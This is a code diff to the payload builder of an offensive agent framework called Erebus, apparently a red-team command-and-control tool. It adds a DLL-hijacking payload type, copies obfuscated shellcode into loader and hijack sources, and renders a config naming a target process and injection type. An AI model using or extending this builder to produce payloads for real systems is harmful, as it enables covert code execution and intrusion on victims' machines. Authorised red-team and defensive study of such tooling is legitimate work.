@@ -857,11 +857,13 @@ generated if none have been entered.""",
 
             shellcode_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader"
             clickonce_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.ClickOnce"
-            encryption_shellcode_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "include" / "shellcode.hpp"
+            encrypted_shellcode_path_sc = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "include" / "shellcode.hpp"
+            encrypted_shellcode_path_dll = PurePath(agent_build_path) / "hijack" / "shellcode.hpp"
 
             shellcode_loader_path = str(shellcode_loader_path)
             clickonce_loader_path = str(clickonce_loader_path)
-            encryption_shellcode_path = str(encryption_shellcode_path)
+            encrypted_shellcode_path_sc = str(encrypted_shellcode_path_sc)
+            encrypted_shellcode_path_dll = str(encrypted_shellcode_path_dll)
 
             shellcrypt_path = PurePath(agent_build_path) / "shellcrypt" / "shellcrypt.py"
             shellcrypt_path = str(shellcrypt_path)
@@ -976,12 +978,15 @@ generated if none have been entered.""",
                 # Copy the obfuscated shellcode file over to the shellcode.hpp file
                 if self.get_parameter("0.1 Loader Type") == "Shellcode Loader":
                     shutil.copy(src=str(obfuscated_shellcode_path),
-                                dst=str(encryption_shellcode_path))
+                                dst=str(encrypted_shellcode_path_sc))
                 elif self.get_parameter("0.1 Loader Type") == "ClickOnce":
-                    # For CSharp format, copy to encryption_shellcode_path which will be read later
+                    # For CSharp format, copy to encrypted_shellcode_path_sc which will be read later
                     shutil.copy(src=str(obfuscated_shellcode_path),
-                                dst=str(encryption_shellcode_path))
-                    output += f"[DEBUG] Copied CSharp shellcode to {encryption_shellcode_path}\n"
+                                dst=str(encrypted_shellcode_path_sc))
+                    output += f"[DEBUG] Copied CSharp shellcode to {encrypted_shellcode_path_sc}\n"
+                elif self.get_parameter("0.0 Main Payload Type") == "Hijack":
+                    shutil.copy(src=str(obfuscated_shellcode_path),
+                                dst=str(encrypted_shellcode_path_dll))
 
                 if self.get_parameter("2.4 Shellcode Format") == "Raw":
                     # Get the encryption key in C format to be used within the loader and other functions
@@ -1007,7 +1012,7 @@ generated if none have been entered.""",
                     end   = shellcode_src.find("};", start) + 2
                     key_array = shellcode_src[start:end]
                     output += key_array
-                    with open(encryption_shellcode_path, "w") as file:
+                    with open(encrypted_shellcode_path_sc, "w") as file:
                         file.write(key_array)
 
                     response.status = BuildStatus.Success
@@ -1090,21 +1095,12 @@ generated if none have been entered.""",
                 with open(obfuscated_shellcode_path, "r") as file:
                     shellcode_content = file.read()
 
-                shellcode = {
-                    "SHELLCODE": shellcode_content
-                }
-
                 exports_list = {
                     "EXPORTS": exports
                 }
 
-                dll_template = environment.get_template("dll_template.cpp")
                 proxy_template = environment.get_template("proxy.def")
-                dll_output = dll_template.render(**shellcode)
                 proxy_output = proxy_template.render(**exports_list)
-
-                with open(dll_hijack_template_path, "w") as file:
-                    file.write(dll_output)
 
                 with open(dll_exports_path, "w") as file:
                     file.write(proxy_output)
@@ -1135,6 +1131,22 @@ generated if none have been entered.""",
                 # Get the hijack directory (source of all hijack files)
                 hijack_dir = PurePath(agent_build_path) / "hijack"
                 hijack_dir_str = str(hijack_dir)
+                
+                # Load and render the config.hpp template
+                config_template = environment.get_template("config.hpp")
+                config_data = {
+                    "TARGET_PROCESS": self.get_parameter("0.5 Shellcode Loader - Target Process"),
+                    "INJECTION_TYPE": self.get_parameter("0.4 Shellcode Loader - Injection Type"),
+                }
+                rendered_config = config_template.render(**config_data)
+
+                # Write the rendered config to the destination
+                with open(config_hpp_destination, "w") as config_file:
+                    config_file.write(rendered_config)
+                
+                # Copy config file to the hijack directory
+                shutil.copy(src=str(config_hpp_destination),
+                            dst=str(hijack_dir / "config.hpp"))
 
                 # Use make to compile the DLL with all hijack directory files
                 cmd = [
@@ -1158,6 +1170,9 @@ generated if none have been entered.""",
                     output += f"[stdout]\n{stdout.decode()}"
                 if stderr:
                     output += f"[stderr]\n{stderr.decode()}"
+
+                # Copy the compiled DLL to the payload path
+                shutil.copy(dst=payload_path, src=f"{hijack_dir_str}/bin/{dll_file_name}")
 
                 if os.path.exists(payload_path):
                     # response.payload = open(payload_path, "rb").read()
@@ -1336,11 +1351,11 @@ generated if none have been entered.""",
                     try:
                         encryption_key_bytes = ""
                         encrypted_shellcode_bytes = ""
-                        if os.path.exists(encryption_shellcode_path):
+                        if os.path.exists(encrypted_shellcode_path_sc):
                             try:
-                                with open(encryption_shellcode_path, "r") as combined_file:
+                                with open(encrypted_shellcode_path_sc, "r") as combined_file:
                                     combined_content = combined_file.read()
-                                    output += f"[DEBUG] File read from: {encryption_shellcode_path}\n"
+                                    output += f"[DEBUG] File read from: {encrypted_shellcode_path_sc}\n"
                                     output += f"[DEBUG] File size: {len(combined_content)} bytes\n"
                                     output += f"[DEBUG] First 500 chars: {combined_content[:500]}\n"
                                     import re
@@ -1376,7 +1391,7 @@ generated if none have been entered.""",
                             except Exception as extract_error:
                                 output += f"Warning: Could not extract encryption key or shellcode: {str(extract_error)}\n"
                         else:
-                            output += f"[DEBUG] File does not exist: {encryption_shellcode_path}\n"
+                            output += f"[DEBUG] File does not exist: {encrypted_shellcode_path_sc}\n"
 
                         injection_config_template = environment.get_template("InjectionConfig.cs")
                         injection_config_data = {
